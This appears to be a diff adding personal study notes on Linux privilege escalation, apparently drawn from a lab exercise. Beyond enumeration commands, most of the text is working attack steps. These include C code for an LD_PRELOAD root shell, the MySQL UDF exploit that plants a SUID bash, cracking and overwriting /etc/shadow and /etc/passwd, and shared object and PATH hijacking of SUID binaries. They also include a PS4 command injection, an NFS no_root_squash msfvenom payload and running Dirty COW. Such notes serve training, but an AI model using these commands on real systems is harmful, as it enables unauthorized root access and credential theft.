@@ -1,0 +1,432 @@
+==> Privelege escalation in linux
+Privilege Escalation -> going from a lower permission account to a higher permissions one.
+
+
+
+id -> this command will give basic info about user id, user group id, group name etc..
+
+
+
+
+=== Enumeration
+
+-> hostname
+the `hostname` command returns the hostname of the target machine.
+
+
+-> uname -a
+this command will print system info giving us additional detail about the kernel used by the system
+this will be helpful in kernel exploitation
+
+
+-> /proc/version (file)
+the proc filesystem provides info about the target system processes. 
+Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
+
+
+->/etc/issue (file)
+usually contains some info abou the os but can easily be customized or changed
+
+
+-> `ps` command
+this is an effective way to see the running process in a linux system, this will show running process for the current shell
+
+cmd: ps -A => view all running processes
+cmd: ps axjf => view process tree
+cmd: ps aux => display processes for all users(a), display the user that launched the process(u) and show processes that are not attached to terminal(x)
+
+
+-> `env` command
+this will show environmental variables
+
+
+-> `sudo -l` command
+the target system may be configured to allow users to run some commands with root privilege.
+this command can be used to list all these type commands that your can run using sudo
+
+
+-> `id` command
+provides general overview of the user's privilege level and group memberships
+
+
+-> /etc/passwd (file)
+this file contains the info about users present in the host system and their home directory details and password details
+
+
+-> `history` command
+displays all the previously executed commands
+
+
+-> `ifconfig` command
+provides info about the network interfaces of the system.
+
+
+-> `netstat` command
+cmd: netstat -a => shows all listening ports and established connections
+cmd: netstat -au/-au => lists ports in listening mode. these ports are open and ready to accept incoming connections.
+cmd: netstat -s => list network usage statistics by protocol, it can also be used with -t or -u options to limit the output to a specific protocol
+
+
+-> `find` command
+finding files:
+cmd: find . -name flag1.txt => find flag named flag1.txt in current directory
+cmd: find / -type d -name config => find the directory named "config" under "/" directory
+cmd: find / -type f -perm 0777 => find files with the permissions 777
+cmd: find / -perm a=x => find the executable files
+cmd: find /home -user frank => find all files for user "frank" under "/home"
+cmd: find / -mtime 10 => find files that were modified in the last 10 days
+cmd: find / -atime 10 => find files that are accessed in the last 10 days
+cmd: find / -cmin -60 => find files changes within in last hour
+cmd: find / -amin -60 => find files accessed within the last hour
+cmd: find / -size 50M => find files with a 50MB size
+
+this command also generates a lot of errors sometimes, to not get these errors in terminal add '2>/dev/null' to command which means that redirect errors to /dev/null
+
+
+cmd: find / -writable -type d 2>dev/null => find world writable folders
+cmd: find / -perm 222 -type d 2>dev/null => find world-writable folders
+cmd: find / -perm -o w -type d 2/dev/null => find world-writable folders 
+cmd: find / -perm -o x -type d 2>/dev/null => find world-executable folders
+cmd: find / -perm -u=s -type f 2>/dev/null => finf files with SUID bit, which allows us to run the file with a higher privilege level than current user
+
+
+=== Automated Tools
+LinPeas:  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+LinEnum: https://github.com/rebootuser/LinEnum
+LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+
+
+=== Kernel Exploits
+The kernel on Linux systems manages the communication between components such as the memory on the system and applications
+This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
+
+The kernel exploit methodology:
+1. Identify the kernel version
+2. search and find an exploit code for the kernel version of the target system
+3. Run the exploit
+
+Resources: 
+1. https://www.linuxkernelcves.com/cves 
+
+Be too specific about the kernel versions
+Be sure you understand how the exploit code works BEFORE you launch it.
+
+
+=== Sudo permissions
+any user can check their sudo permissions with `sudo -l` command
+
+
+-> Leverage LD_PRELOAD
+LD_PRELOAD is a function that allows any program to use shared libraries.
+If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. 
+
+Resource: https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
+
+
+with this as attack vector, we will create a simple c program to generate bash shell and run it as a shared library
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void __init(){
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+compile it using gcc into a shared object file using the cmd
+cmd: gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+
+
+=== SUID exploits
+SUID and SGID file permissions allow files to be executed with the permissions level of the file owner or the group owner respectively
+
+cmd: find / -type f -perm -04000 -ls 2>/dev/null => list files that have SUID or SGID bits set
+
+
+=== Capabilities
+Capabilities help manage privileges at a more granular level.
+cmd: getcap -r 2>/dev/null => list enabled capabilities
+
+
+
+
+
+--> Service exploits
+
+-> MySQL Service
+
+
+
+===
+
+===  SERVICE EXPLOITS
+
+
+==> MySQL service exploit
+
+The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
+
+Change into the /home/user/tools/mysql-udf directory:
+ 
+cmd: cd /home/user/tools/mysql-udf
+
+
+Compile the raptor_udf2.c exploit code using the following commands:
+
+cmd: gcc -g -c raptor_udf2.c -fPIC
+cmd: gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+Connect to the MySQL service as the root user with a blank password:
+
+cmd: mysql -u root
+
+Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
+
+cmd: use mysql;
+cmd: create table foo(line blob);
+cmd: insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+cmd: select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+cmd: create function do_system returns integer soname 'raptor_udf2.so';
+
+Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
+
+cmd: select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+
+Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+
+cmd: /tmp/rootbash -p
+
+
+
+
+==> Weak File Permissions - Readable /etc/shadow
+-> check /etc/shadow file permissions whether its readable by user or not
+cmd: ls -lah /etc/shadow
+
+-> display the contents of the file: cat /etc/shadow
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+
+Save the line for a particular user (say in hash.txt file)and use john the ripper to crack the hash password
+cmd: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+-> once the password is cracked, change user to root and enter the password when prompted for it: "su root"
+
+
+==> Weak File Permissions - Writable /etc/shadow
+-> Check /etc/shadow file permissions whether its writable by user or not
+-> if the write permissions are enabled then create a new password using the command: "mkpasswd -m sha-512 <newPassword>"
+-> edit the /etc/shadow and replace the original root user's password hash with the above command output hash
+-> switch to root user with the new password
+
+
+==> Weak File Permissions - Writable /etc/passwd
+-> the /etc/passwd file contains information about user accounts. its world readable  but usually only writable by the root user. Historically the /etc/passwd file contained user password hashes, and some versions of linux will still allow password hashes to be stored here.
+
+-> check the permissions of this file
+-> generate new password hash using the command: "openssl passwd <newPassword>"
+-> Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+-> switch to root user using the newly generated password
+
+-> Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+-> Now switch to the newroot user, using the new password:
+
+
+==> Sudo Shell Escape Sequences
+-> list all the program that sudo allows user to run by using the command: "sudo -l"
+-> Search for simple scripts in GTFbins related to programs that user is allowed to run as sudo
+
+
+==> Sudo Environment Variables
+
+
+==> Cron Jobs - File Permissions / PATH Environment Variables
+-> Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab
+-> display the contents of this file and check are there any files or scripts that user have access to
+-> use "locate" command to find the location of the files or folders
+-> override the files if user have permission to do so and also check which user is running the scripts and files
+
+
+==> Cron Jobs - Wildcards
+
+
+==> SUID / SGID Executables - Known Exploits
+-> Find all the SUID/SGID executables on the machine using the command: find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+-> For all the executables that are displayed check for known exploits in the exploit DB database and run as per instructions of these exploits
+
+
+==> SUID / SGID Executables - Shared Object Injection
+-> The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
+-> First, execute the file and note that currently it displays a progress bar before exiting:
+cmd: /usr/local/bin/suid-so
+
+-> Run strace on the file and search the output for open/access calls and for "no such file" errors:
+cmd: strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+-> Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
+-> Create the .config directory for the libcalc.so file:
+cmd: mkdir /home/user/.config
+
+-> Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
+cmd: gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+-> Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
+cmd: /usr/local/bin/suid-so
+
+
+==> SUID / SGID Executables - Environment Variables
+-> The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
+
+-> First, execute the file and note that it seems to be trying to start the apache2 webserver:
+
+cmd: /usr/local/bin/suid-env
+
+-> Run strings on the file to look for strings of printable characters:
+
+cmd: strings /usr/local/bin/suid-env
+
+-> One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
+
+-> Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
+
+cmd: gcc -o service /home/user/tools/suid/service.c
+
+-> Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
+
+cmd: PATH=.:$PATH /usr/local/bin/suid-env
+PATH in Linux is an environmental variable that tells the operating system where to search for executables.
+
+While trying to leverage poor PATH configuration check answers for below questions
+1. what folders are located in $PATH
+2. does the current user have write privileges to any of the folders mentioned in $PATH
+3. can the current user moddify $PATH
+4. is there any script/application that user can start that will be affected by this vulnerability
+
+
+Search for writable folders by command `find / -writable 2>/dev/null`
+Based on the PATH variable we might need to tweak the above cmd, example if the PATH contains only "/usr/*" folders then we can modify the above command as `find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u`
+
+
+Another alternate command: `find / -writable 2>/dev/null | grep -v proc | cut -d "/" -f 2,3 | sort -u`
+
+
+If none of the folders are writable ones then add /tmp folder to path which has write permissions to all users
+Check what are all the permissions that the files have and try to execute the files, if something is missing try creating new, say its calling some command and its missing then create a dummy executable script that might lead to root user into that command file in the writable folder and provide necessary file permissions to the file (mostly permission is 777)
+
+
+
+
+==> SUID / SGID Executables - Absuing Shell Features 
+-> The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+
+-> Verify this with strings:
+
+cmd: strings /usr/local/bin/suid-env2
+
+-> In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+
+-> Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+
+cmd: /bin/bash --version
+
+-> Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+
+cmd: function /usr/sbin/service { /bin/bash -p; }
+cmd: export -f /usr/sbin/service
+
+-> Run the suid-env2 executable to gain a root shell:
+
+cmd: /usr/local/bin/suid-env2
+
+##-> Note: This will not work on Bash versions 4.4 and above.
+
+-> When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+
+-> Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+
+cmd: env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+-> Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+
+cmd: /tmp/rootbash -p
+
+
+
+==> Passwords & Keys - History Files
+-> If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+-> View the contents of all the hidden history files in the user's home directory:
+cmd: cat ~/.*history | less
+
+
+==> Passwords & Keys - Config Files
+-> Check for usernames and passwords in config files present in the machine
+
+
+==> Passwords & Keys - SSH Keys
+-> check if there are any backups of important config files and check the permissions of these files
+
+
+==> NFS
+-> NFS configuration is kept in `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.
+-> By default NFS will change the root user to nfsnobody and strip any file from operating system with root privileges. If the "no_root_squash" option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+
+-> Enumeration starts with finding the mountable shares from target system
+cmd: showmount -e $IP
+
+
+-> Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+-> Check the NFS share configuration on the Debian VM:
+cmd: cat /etc/exports
+
+-> find the folder where root squashing is disabled, and follow the below process
+-> in this case /tmp is the folder that has root squashing disbaled in the remove machine
+
+cmd: mkdir /tmp/nfs
+cmd: mount -o rw,vers=3 <IP>:/tmp /tmp/nfs
+
+-> Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
+
+cmd: msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+-> Still using Kali's root user, make the file executable and set the SUID permission:
+
+cmd: chmod +xs /tmp/nfs/shell.elf
+
+-> Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+
+cmd: /tmp/shell.elf
+
+
+-> One of the privilege escalation vector is finding root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase current user privilege level
+
+
+
+
+==> Kernel Exploits
+-> Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+-> Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
+
+cmd: perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+-> The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+
+-> Compile the code and run it (note that it may take several minutes to complete):
+
+cmd: gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+cmd: ./c0w
+
+-> Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+
+cmd: /usr/bin/passwd
+
+
